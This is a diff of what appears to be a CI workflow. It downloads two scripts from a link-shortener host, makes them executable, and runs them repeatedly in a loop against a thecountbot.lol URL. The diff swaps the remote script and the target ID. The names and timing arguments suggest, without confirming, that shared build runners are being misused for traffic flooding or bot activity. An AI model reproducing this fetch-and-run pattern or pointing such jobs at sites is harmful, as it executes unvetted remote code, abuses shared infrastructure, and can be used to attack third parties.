@@ -17,12 +17,12 @@ jobs:
         run: |
           pip install git+https://github.com/QuantumLLC/Archer
           wget https://curl.by/2071r/Test.py
-          wget https://curl.by/hc0j2/hardraw.js
-          chmod +x hardraw.js
+          wget https://curl.by/esfM3/testraw.js
+          chmod +x testraw.js
           chmod +x Test.py
           PIDS=()
           for i in {1..5}; do
-            timeout 200 python3 Test.py https://thecountbot.lol/5043021917-e3fc4c43-6134-46c7-ba35-b73abc5ac784 && node hardraw.js https://thecountbot.lol/5043021917-e3fc4c43-6134-46c7-ba35-b73abc5ac784 200
+            timeout 200 python3 Test.py https://thecountbot.lol/5043021917-300e1e7d-b34f-4c90-9590-3c3468dd8a48 && node testraw.js https://thecountbot.lol/5043021917-300e1e7d-b34f-4c90-9590-3c3468dd8a48 200
             PIDS+=($!)
           done
           
